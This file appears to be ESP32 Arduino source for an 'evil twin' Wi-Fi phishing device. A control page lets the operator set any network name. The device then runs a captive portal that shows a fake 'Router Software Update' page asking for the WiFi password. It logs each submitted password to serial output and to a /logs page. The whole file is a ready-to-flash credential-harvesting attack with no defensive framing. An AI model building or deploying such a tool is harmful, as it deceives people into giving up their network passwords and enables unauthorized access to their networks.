#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>

const char* manageSSID = "SureWifi";
const char* managePassword = "The0PassP0";
AsyncWebServer server(80);
DNSServer dnsServer;

String captiveSSID = "NewNetworkSSID";
String logData = "";

void startCaptivePortal() {
  WiFi.softAP(captiveSSID.c_str());
  Serial.println("Captive Portal WiFi Network Started: " + captiveSSID);

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.onNotFound([](AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
    response->print(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Software Update</title>
<style>
  body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
  h1, p { font-size: 1.2em; }
  form { margin-top: 20px; }
  input[type="password"], button[type="submit"] { font-size: 1.2em; width: 100%; padding: 15px; margin-top: 10px; border-radius: 5px; border: 1px solid #ddd; }
  button[type="submit"] { background-color: #007bff; color: white; border: none; cursor: pointer; }
  button[type="submit"]:hover { background-color: #0056b3; }
</style>
</head>
<body>
<div class="container">
  <h1>Router Software Update</h1>
  <p>Enter your WiFi password</p>
  <form action="/submit" method="POST">
    Password: <input type="password" name="password">
    <button type="submit">Send</button>
  </form>
</div>
</body>
</html>
    )rawliteral");
    request->send(response);
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("password", true)) {
      String password = request->getParam("password", true)->value();
      logData += "Password: " + password + "\n";
      Serial.println("Password entered: " + password);
    }
    request->redirect("/thankyou");
  });

  server.on("/thankyou", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html; charset=utf-8", "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Password Received</title></head><body><h1>Password Received</h1><p>Updating!</p></body></html>");
  });

  server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    String logsPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Logs</title>
<style>
  body { font-family: 'Arial', sans-serif; margin: 0; padding: 20px; background-color: #f0f0f0; }
  .log-card { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; padding: 15px; font-size: 16px; }
  .log-time { font-size: 0.9em; color: #666; }
  .log-text { color: #333; }
</style>
</head>
<body>
<h2>Logs</h2>
    )rawliteral";
    
    // Допустим, logData содержит записи логов, разделенные новой строкой
    int startPos = 0;
    int endPos = logData.indexOf("\n", startPos);
    while (endPos != -1) {
        String logEntry = logData.substring(startPos, endPos);
        logsPage += "<div class='log-card'><div class='log-text'>" + logEntry + "</div></div>";
        startPos = endPos + 1;
        endPos = logData.indexOf("\n", startPos);
    }
    // Добавляем последнюю запись, если она не оканчивается на \n
    if(startPos < logData.length()) {
        logsPage += "<div class='log-card'><div class='log-text'>" + logData.substring(startPos) + "</div></div>";
    }

    logsPage += "</body></html>";
    request->send(200, "text/html", logsPage);
});


  server.begin();
}

void setup() {
  Serial.begin(115200);
  
  WiFi.softAP(manageSSID, managePassword);
  Serial.print("Setup WiFi Network Started: ");
  Serial.println(WiFi.softAPIP());

  server.on("/control", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html; charset=utf-8", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Control Panel</title>
<style>
  body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0; }
  .container { background-color: #fff; padding: 20px; margin-top: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
  h2 { font-size: 1.5em; }
  input[type="text"], input[type="submit"] { font-size: 1.2em; width: calc(100% - 24px); padding: 10px 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
  input[type="submit"] { background-color: #4CAF50; color: white; cursor: pointer; }
  input[type="submit"]:hover { background-color: #45a049; }
</style>
</head>
<body>
<div class="container">
  <h2>Captive Portal WiFi Setup</h2>
  <form action="/setssid" method="POST">
    <input type="text" name="ssid" placeholder="WiFi SSID:" required>
    <input type="submit" value="RUN">
  </form>
</div>
</body>
</html>
    )rawliteral");
  });

  server.on("/setssid", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("ssid", true)) {
      captiveSSID = request->getParam("ssid", true)->value();
      WiFi.softAPdisconnect(true);
      delay(1000); // Short delay to ensure the previous network is turned off
      startCaptivePortal();
    } else {
      request->send(200, "text/plain", "SSID is required.");
    }
  });

  server.begin(); // Start the server for the setup phase
}

void loop() {
  dnsServer.processNextRequest(); // Handle DNS requests for the Captive Portal
}


